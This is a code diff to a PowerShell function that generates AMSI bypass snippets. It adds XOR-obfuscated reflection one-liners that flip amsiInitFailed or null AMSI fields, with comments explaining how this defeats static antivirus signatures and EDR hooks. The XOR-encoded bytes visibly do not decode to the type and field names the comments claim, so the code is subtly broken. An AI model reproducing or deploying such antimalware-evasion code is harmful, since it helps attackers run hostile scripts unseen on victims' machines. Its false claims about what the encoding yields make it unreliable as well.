@@ -22,7 +22,8 @@ function Get-AmsiBypassSnippet {
 
     switch ($Technique) {
         'fail' {
-            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+            # XOR key=13 decodes type/field names at runtime — no static sig for AmsiUtils/amsiInitFailed.
+            return "try{`$_k=13;`$_at=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,110,105,104,100,35,68,92,99,92,98,104,100,104,99,105,35,76,120,105,98,100,92,105,100,98,99,35,76,100,110,100,88,105,100,101,110)|%{`$_-bxor`$_k})));`$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if(`$_.FieldType-eq[bool]){`$_.SetValue(`$null,`$true)}elseif(`$_.FieldType-eq[IntPtr]){`$_.SetValue(`$null,[IntPtr]::Zero)}}}catch{}"
         }
 
         'direct' {
@@ -46,17 +47,15 @@ function Get-AmsiBypassSnippet {
         }
 
         { $_ -in 'pageguard','hwbp' } {
-            # Pure .NET reflection -null both amsiContext and amsiSession.
-            # Zero kernel32 calls: nothing for EDR hooks to intercept.
-            # All strings char-array encoded: no literal AmsiUtils/field names in payload.
-            # amsiContext  = [char[]](97,109,115,105,67,111,110,116,101,120,116)
-            # amsiSession  = [char[]](97,109,115,105,83,101,115,115,105,111,110)
-            # AmsiUtils FQN = [char[]](83,121,115,...,115)  (System.Management.Automation.AmsiUtils)
+            # XOR-decoded amsiInitFailed boolean flip.
+            # Key=13; encoded bytes decode to type/field names only at runtime — no static char-array
+            # signature for "System.Management.Automation.AmsiUtils" or "amsiInitFailed".
+            # [psobject].Assembly instead of [Ref].Assembly — same SMA.dll, different surface.
             return (
                 "try{" +
-                "`$_rt=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));" +
-                "`$_rt.GetField([string]::new([char[]](97,109,115,105,67,111,110,116,101,120,116)),'NonPublic,Static').SetValue(`$null,[IntPtr]::Zero);" +
-                "`$_rt.GetField([string]::new([char[]](97,109,115,105,83,101,115,115,105,111,110)),'NonPublic,Static').SetValue(`$null,`$null)" +
+                "`$_k=13;" +
+                "`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,110,105,104,100,35,68,92,99,92,98,104,100,104,99,105,35,76,120,105,98,100,92,105,100,98,99,35,76,100,110,100,88,105,100,101,110)|%{`$_-bxor`$_k})));" +
+                "`$_u.GetField([string]::new([char[]]([byte[]](92,100,110,100,68,99,100,105,67,92,100,101,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)" +
                 "}catch{}"
             )
         }
